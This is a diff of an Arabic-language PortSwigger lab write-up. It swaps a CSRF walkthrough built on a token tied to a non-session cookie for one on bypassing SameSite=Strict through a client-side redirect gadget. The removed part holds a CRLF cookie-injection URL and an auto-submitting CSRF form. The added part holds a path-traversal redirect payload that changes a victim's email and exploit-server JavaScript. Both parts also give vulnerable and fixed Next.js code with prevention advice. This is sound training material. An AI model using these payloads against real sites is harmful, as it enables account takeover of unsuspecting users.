@@ -1,118 +1,123 @@
-# Lab: CSRF where token is tied to non-session cookie
+# Lab: SameSite Strict bypass via client-side redirect
 
 > **Category:** CSRF  
 > **Difficulty:** PRACTITIONER  
-> **Lab Link:** [PortSwigger Lab - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
+> **Lab Link:** [PortSwigger Lab - SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
 
 ---
 
 ## 🎯 الهدف الرئيسي
 
-استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يربط CSRF Token بـ **كوكي غير مربوط بالجلسة** (non-session cookie). يمكننا حقن هذه الكوكي في متصفح الضحية باستخدام ثغرة **CRLF Injection** في وظيفة البحث، ثم تنفيذ هجوم CSRF.
-
-**الحسابات:** `wiener:peter` و `carlos:montoya`
+استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يستخدم **SameSite=Strict** للكوكي، مما يمنع إرسال الكوكي في أي طلب عبر المواقع. ولكننا سنجد **قطعة (gadget)** تؤدي إلى إعادة توجيه (redirect) من جانب العميل، مما يسمح لنا بإرسال طلب GET مع الكوكي.
 
 ---
 
 ## 📝 الحل خطوة بخطوة
 
-### الخطوة 1: تسجيل الدخول وفهم آلية التحقق
+### الخطوة 1: تسجيل الدخول وفهم إعدادات SameSite
 
 - سجل الدخول بـ `wiener:peter`
-- اذهب إلى **My account** → **Update email**
-- اعترض الطلب في Burp:
+- افتح **DevTools** في المتصفح (F12) → تبويب **Application** → **Cookies**
+- ستجد أن كوكي `session` له خاصية `SameSite=Strict`
 
-```http
-POST /my-account/change-email HTTP/1.1
-Cookie: session=SESSION_WIENER; csrfKey=KEY_WIENER
+هذا يعني: الكوكي لن يرسل في أي طلب من موقع خارجي (لا GET ولا POST).
 
-email=test@test.com&csrf=TOKEN_WIENER
+### الخطوة 2: البحث عن "قطعة" (gadget) تعيد التوجيه
+
+نحتاج قطعة في الموقع نفسه تسبب **إعادة توجيه (redirect)** باستخدام مدخلات من المستخدم.
+
+**كيف نجدها؟**
+
+- تصفح الموقع وجرب جميع الوظائف
+- وجدنا أن إضافة تعليق (Post comment) تعرض صفحة تأكيد ثم تعيد التوجيه تلقائياً
+
+### الخطوة 3: تحليل آلية إعادة التوجيه
+
+- اذهب إلى أي مقال (blog post)
+- اكتب تعليقاً عادياً
+- لاحظ أنك تُنقل إلى:
+  ```
+  /post/comment/confirmation?postId=1
+  ```
+- بعد 5 ثوانٍ، يتم توجيهك تلقائياً إلى المقال مرة أخرى
+
+### الخطوة 4: فحص كود JavaScript المسؤول عن التوجيه
+
+- افتح **DevTools** → تبويب **Network**
+- ابحث عن ملف: `/resources/js/commentConfirmationRedirect.js`
+- محتواه:
+
+```javascript
+const postId = new URLSearchParams(window.location.search).get('postId');
+setTimeout(() => {
+    window.location = `/post/${postId}`;
+}, 5000);
 ```
 
-**ملاحظة:** التوكن (`csrf`) مربوط بكوكي `csrfKey` وليس بالجلسة.
+**هذه هي القطعة!** ✅
+- تأخذ `postId` من الرابط
+- تبني رابط التوجيه منه مباشرة بدون تحقق
 
-### الخطوة 2: اختبار أن التوكن يعمل عبر الحسابات
+### الخطوة 5: اختبار Path Traversal في postId
 
-- أرسل الطلب إلى Repeater
-- غير قيمة `session` إلى قيمة عشوائية → يرفض الطلب ✅
-- غير قيمة `csrfKey` فقط إلى قيمة عشوائية → يرفض الطلب ✅
-- غير `csrfKey` و `csrf` معاً بقيم صحيحة من حساب آخر → **الطلب ينجح** ✅
-
-**الاستنتاج:** `csrfKey` غير مربوط بجلسة `session`، ويمكن استخدامه على أي حساب.
-
-### الخطوة 3: استخراج csrfKey و csrf من حساب wiener
-
-من طلب wiener، انسخ:
-- `csrfKey=WIENER_CSRF_KEY`
-- `csrf=WIENER_TOKEN`
-
-### الخطوة 4: إثبات أن التوكن يعمل على حساب carlos
-
-- افتح نافذة خاصة (Incognito)
-- سجل الدخول بـ `carlos:montoya`
-- في Repeater، استبدل `csrfKey` و `csrf` بقيم wiener
-- الطلب ينجح ✅
-
-### الخطوة 5: اكتشاف CRLF Injection في البحث
-
-لاحظ أن وظيفة البحث تعكس المدخلات في `Set-Cookie`:
-
-```http
-GET /?search=test HTTP/1.1
+جرب هذا الرابط:
+```
+/post/comment/confirmation?postId=1/../../my-account
 ```
 
-الرد:
+**النتيجة:** بعد 5 ثوانٍ، يتم توجيهك إلى `/my-account` ✅
+
+**لماذا نجح؟** لأن المتصفح يعالج المسار ويزيل `..` فتصبح: `/post/1/../../my-account` = `/my-account`
+
+### الخطوة 6: اختبار تغيير البريد عبر GET
+
+جرب تغيير البريد مباشرة عبر الرابط:
 ```
-Set-Cookie: search=test; SameSite=None
+/my-account/change-email?email=hacked@attacker.net
 ```
 
-**نستغل هذا لحقن كوكي:** `%0d%0a` = سطر جديد
+**النتيجة:** ينجح! ✅ الموقع يقبل GET لتغيير البريد.
 
-### الخطوة 6: إنشاء رابط لحقن كوكي csrfKey
+### الخطوة 7: دمج كل شيء في هجوم واحد
 
+نحتاج إلى:
+1. رابط يبدأ بـ `/post/comment/confirmation`
+2. ويدخل إلى `postId` مسار يؤدي إلى تغيير البريد
+
+الهجوم النهائي:
 ```
-https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None
+/post/comment/confirmation?postId=1/../../my-account/change-email?email=victim@attacker.net%26submit=1
 ```
 
-**ماذا يحدث؟** الخادم يرد بـ:
-```
-Set-Cookie: search=test
-Set-Cookie: csrfKey=WIENER_CSRF_KEY; SameSite=None
-```
+**ملاحظة:** نستخدم `%26` بدل `&` حتى لا ينقطع معامل `postId`.
 
-### الخطوة 7: بناء HTML للهجوم
+### الخطوة 8: إنشاء صفحة الهجوم على Exploit Server
 
 ```html
-<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
-
-<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="email" value="victim%40attacker.net">
-    <input type="hidden" name="csrf" value="WIENER_TOKEN">
-</form>
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=victim%40attacker.net%26submit=1";
+</script>
 ```
 
-**لماذا `onerror`؟** الصورة تحاول التحميل، تفشل (لأنها ليست صورة) ثم يتم إرسال الفورم.
-
-### الخطوة 8: رفع الهجوم إلى Exploit Server
+### الخطوة 9: رفع الهجوم إلى Exploit Server
 
 - اضغط **Go to exploit server**
 - في حقل **Body**، الصق الـ HTML
-- استبدل `YOUR-LAB-ID` و `WIENER_CSRF_KEY` و `WIENER_TOKEN`
 - اضغط **Store**
 
-### الخطوة 9: تجربة الهجوم على نفسك
+### الخطوة 10: تجربة الهجوم على نفسك
 
 - اضغط **View exploit**
-- انتظر ثانية
+- انتظر 5 ثوانٍ
 - ارجع إلى حسابك → لاحظ أن بريدك تغير ✅
 
-### الخطوة 10: تسليم الهجوم للضحية
+### الخطوة 11: تسليم الهجوم للضحية
 
 - غير البريد الإلكتروني إلى قيمة مختلفة
 - اضغط **Store**
 - اضغط **Deliver to victim**
 
-### الخطوة 11: حل المختبر
+### الخطوة 12: حل المختبر
 
 بعد بضع ثوانٍ، سيتم حل المختبر ✅
 
@@ -122,11 +127,20 @@ Set-Cookie: csrfKey=WIENER_CSRF_KEY; SameSite=None
 
 | النقطة | الشرح |
 |--------|-------|
-| **ما هي non-session cookie؟** | كوكي غير مربوط بجلسة المستخدم (مثل `csrfKey`) |
-| **كيف حقنّا الكوكي؟** | باستخدام CRLF Injection في وظيفة البحث |
-| **ماذا يفعل `%0d%0a`؟** | سطر جديد (CRLF) يسمح بحقن هيدرات جديدة |
-| **لماذا `SameSite=None`؟** | ليسمح بإرسال الكوكي في الطلبات عبر المواقع |
-| **لماذا `onerror`؟** | الصورة تفشل في التحميل فتنفذ الفورم |
+| **ما هو SameSite=Strict؟** | يمنع إرسال الكوكي في أي طلب عبر المواقع |
+| **كيف تجاوزناه؟** | باستخدام إعادة توجيه من جانب العميل (client-side redirect) |
+| **لماذا نجح؟** | الإعادة الأولى (خارج الموقع) لا تحمل كوكي، لكن الإعادة الثانية (داخل الموقع) تحمل كوكي |
+| **ما هي القطعة (gadget)؟** | صفحة `/post/comment/confirmation` التي تعيد التوجيه ديناميكياً |
+| **لماذا استخدمنا `%26`؟** | لتشفير `&` حتى لا ينقطع معامل `postId` |
+
+---
+
+## 📊 ملخص آلية التجاوز
+
+| الطلب | يحمل الكوكي؟ | السبب |
+|-------|-------------|-------|
+| الرابط الأول (من موقع المهاجم) | ❌ لا | SameSite=Strict |
+| إعادة التوجيه داخل نفس الموقع | ✅ نعم | لأنها من نفس الموقع |
 
 ---
 
@@ -134,20 +148,33 @@ Set-Cookie: csrfKey=WIENER_CSRF_KEY; SameSite=None
 
 ### 📌 Vulnerability Root Cause
 
-1. CSRF Token مربوط بكوكي غير مربوط بالجلسة (`csrfKey` قابل للمشاركة بين الحسابات)
-2. وجود ثغرة **CRLF Injection** في وظيفة البحث تسمح بحقن كوكي جديد
+1. استخدام SameSite=Strict فقط بدون حماية إضافية
+2. وجود قطعة (gadget) تسمح بـ open redirect أو path traversal في إعادة التوجيه
+3. تغيير البريد يدعم طلبات GET
 
 ---
 
 ### ❌ Non-Compliant Code (Next.js)
 
 ```javascript
-// وظيفة البحث - فيها CRLF Injection
-res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);
+// إعدادات الكوكي - SameSite=Strict فقط
+res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`);
 
-// وظيفة تغيير البريد - التوكن مربوط بـ csrfKey
-if (getCsrfToken(csrfKey) !== csrf) {
-  return res.status(403).send('Invalid CSRF token');
+// قطعة إعادة التوجيه - ملف commentConfirmationRedirect.js
+// خطأ: استخدام مدخلات المستخدم مباشرة في window.location
+const postId = new URLSearchParams(window.location.search).get('postId');
+setTimeout(() => {
+    window.location = `/post/${postId}`; // Open redirect + Path traversal!
+}, 5000);
+
+// وظيفة تغيير البريد - تسمح بـ GET
+export default function handler(req, res) {
+  const { email, submit } = req.query; // تدعم GET
+  const { sessionId } = req.cookies;
+  
+  const user = getUserBySession(sessionId);
+  updateUserEmail(user.id, email);
+  res.send('Email updated');
 }
 ```
 
@@ -156,33 +183,61 @@ if (getCsrfToken(csrfKey) !== csrf) {
 ### ✅ Compliant Code (Next.js)
 
 ```javascript
-// وظيفة البحث - إزالة CRLF
-search = search.replace(/[\r\n]/g, '');
+// إعدادات الكوكي - SameSite=Strict + CSRF Token
+res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`);
 
-// وظيفة تغيير البريد - التوكن مربوط بالجلسة
-const expectedToken = sessionTokens.get(sessionId);
-if (!expectedToken || expectedToken !== csrf) {
-  return res.status(403).send('Invalid CSRF token');
+// قطعة إعادة التوجيه - إصلاح: التحقق من المدخلات
+const postId = new URLSearchParams(window.location.search).get('postId');
+
+// السماح فقط بأرقام صحيحة (whitelist)
+if (/^\d+$/.test(postId)) {
+  setTimeout(() => {
+    window.location = `/post/${postId}`;
+  }, 5000);
+} else {
+  // إذا كان المدخل غير صالح، لا تعيد التوجيه
+  window.location = `/post/404`;
+}
+
+// وظيفة تغيير البريد - إصلاح: رفض GET
+export default function handler(req, res) {
+  // رفض أي طلب ليس POST
+  if (req.method !== 'POST') {
+    return res.status(405).send('Method not allowed');
+  }
+  
+  const { email, csrfToken } = req.body;
+  const { sessionId } = req.cookies;
+  
+  // التحقق من CSRF Token
+  if (!csrfToken || !verifyCsrfToken(sessionId, csrfToken)) {
+    return res.status(403).send('Invalid CSRF token');
+  }
+  
+  const user = getUserBySession(sessionId);
+  updateUserEmail(user.id, email);
+  res.send('Email updated');
 }
 ```
 
 **الخلاصة:** 
-1. التوكن يجب أن يكون مربوطاً بالجلسة، وليس بكوكي منفصل
-2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم
+1. لا تعتمد على SameSite=Strict فقط
+2. امنع open redirect و path traversal في إعادة التوجيه
+3. استخدم CSRF Tokens وارفض GET للطلبات الحساسة
 
 ---
 
 ## 🛡️ كيفية الوقاية (How to Prevent)
 
-1. **ربط التوكن بالجلسة:** استخدم `sessionId` لتخزين التوكن.
-2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n` في أي مدخل.
-3. **استخدام SameSite=Lax أو Strict:** كطبقة دفاع إضافية.
-4. **استخدام CSRF Tokens:** حتى مع SameSite.
+1. **استخدام CSRF Tokens:** حتى مع SameSite=Strict.
+2. **منع open redirect:** لا تستخدم مدخلات المستخدم في `window.location`.
+3. **رفض GET للطلبات الحساسة:** تغيير البريد يجب أن يكون POST فقط.
+4. **التحقق من المدخلات (Whitelist):** استخدم whitelist للأرقام أو المعرفات الصالحة فقط.
+5. **استخدام SameSite=Lax أو Strict + CSRF Token معاً.**
 
 ---
 
 ## 🔗 روابط مفيدة
 
-- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
-- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
-- [CRLF Injection](https://portswigger.net/web-security/crlf-injection)
+- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
+- [SameSite Cookies Explained](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
